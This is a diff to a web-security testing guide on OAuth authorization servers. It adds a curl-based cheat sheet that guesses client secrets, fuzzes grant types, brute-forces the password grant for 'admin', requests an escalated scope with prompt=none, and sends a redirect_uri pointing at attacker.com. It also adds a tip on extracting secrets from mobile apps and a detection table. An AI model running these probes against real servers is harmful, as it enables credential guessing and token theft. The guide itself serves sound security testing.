@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-authz-01, wstg-authz-02]
+prerequisites: [wstg-authz-05, wstg-idnt-01, wstg-idnt-02]
+severity_boost:
+  wstg-authz-01: "Authorization Server Weakness + Directory Traversal (leaks the AS's signing keys/config) = tokens can be forged for every client application relying on this AS (Ecosystem-Wide Token Forgery, Critical)"
+  wstg-authz-02: "Authorization Server Weakness + Authorization Bypass = a compromised AS issues tokens for any user/scope while downstream authorization checks can also be bypassed, compromising every relying application (Critical)"
 ---
 
 # wstg-authz-05.1
@@ -429,6 +431,74 @@ done
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use Authorization Server Cheat Sheet
+
+```bash
+AUTH="https://auth.{target}"
+TOKEN_URL="$AUTH/oauth/token"
+CLIENT_ID="{client_id}"
+
+# Discovery metadata dump
+curl -s "$AUTH/.well-known/oauth-authorization-server" | jq '.'
+curl -s "$AUTH/.well-known/openid-configuration" | jq '.grant_types_supported, .token_endpoint_auth_methods_supported, .code_challenge_methods_supported'
+
+# Weak/default client_secret probe
+for s in secret password 123456 client_secret "$CLIENT_ID" ""; do
+  resp=$(curl -s -X POST "$TOKEN_URL" -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$s")
+  echo "$resp" | grep -q access_token && echo "[VULN] weak secret: '$s'"
+done
+
+# Grant-type fuzzing (ROPC / unsupported grants enabled?)
+for gt in authorization_code client_credentials password refresh_token \
+          urn:ietf:params:oauth:grant-type:jwt-bearer; do
+  curl -s -X POST "$TOKEN_URL" -d "grant_type=$gt&client_id=$CLIENT_ID&client_secret=SECRET" \
+    -o /dev/null -w "$gt -> %{http_code}\n"
+done
+
+# ROPC brute force check (should be disabled / rate limited)
+for i in $(seq 1 20); do
+  curl -s -X POST "$TOKEN_URL" -d "grant_type=password&username=admin&password=pass$i&client_id=$CLIENT_ID&client_secret=SECRET" \
+    | jq -r '.error // "success"'
+done
+
+# Token introspection/revocation without proper auth
+curl -s -X POST "$AUTH/oauth/introspect" -d "token=$ACCESS_TOKEN"
+curl -s -X POST "$AUTH/oauth/revoke" -d "token=$ACCESS_TOKEN&token_type_hint=access_token"
+curl -s -X POST "$AUTH/oauth/introspect" -u "CLIENT:SECRET" -d "token=$ACCESS_TOKEN"  # verify revoked=false after revoke call above
+
+# Consent bypass via prompt=none / scope creep
+curl -s "$AUTH/oauth/authorize?client_id=$CLIENT_ID&response_type=code&redirect_uri=https://client.{target}/callback&scope=openid+profile+email+admin&prompt=none"
+
+# Invalid/unexpected scope used to bypass a redirect_uri validation path that only
+# fires on the "happy path" scope check (validation order bug on the AS side)
+curl -s -o /dev/null -D - "$AUTH/oauth/authorize?client_id=$CLIENT_ID&scope=a&redirect_uri=https://attacker.com" | grep -i "^location:"
+
+# Authorization code MUST NOT be reusable (RFC 6749 4.1.2) — confirm the AS revokes
+# all tokens issued from a code the second time it is presented
+CODE="captured_code"
+curl -s -X POST "$TOKEN_URL" -d "grant_type=authorization_code&code=$CODE&client_id=$CLIENT_ID&client_secret=SECRET"
+curl -s -X POST "$TOKEN_URL" -d "grant_type=authorization_code&code=$CODE&client_id=$CLIENT_ID&client_secret=SECRET"  # should error + revoke prior tokens
+```
+
+Note: mobile-app OAuth clients are frequently decompiled to recover a hardcoded client
+secret / private signing key embedded at build time — check APK/IPA resources
+(`strings`, `apktool`, `jadx`) for `client_secret`, `.p12`/`.pem` bundles, or hardcoded
+JWT signing material when this authorization server issues credentials to native apps.
+
+### Detection Patterns
+
+| Signal                                              | Meaning                        |
+| ------------------------------------------------------ | --------------------------------- |
+| `access_token` returned for a guessed/default secret     | Weak client authentication      |
+| `password` grant succeeds unrestricted                   | ROPC enabled without protections|
+| Introspection accepts requests without client auth       | Unauthenticated introspection   |
+| Revoked token still returns `active: true`                | Revocation not enforced         |
+| `prompt=none` silently grants a new/expanded scope        | Consent bypass / scope creep    |
+
+---
+
 ## Remediation Guide
 
 ### 1. Secure Token Generation
@@ -627,6 +697,7 @@ class ConsentManager:
 - [OAuth 2.0 Authorization Server Metadata](https://tools.ietf.org/html/rfc8414)
 - [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
 - [OAuth 2.0 for Native Apps](https://tools.ietf.org/html/rfc8252)
+- [PayloadsAllTheThings - OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration)
 
 
 ---
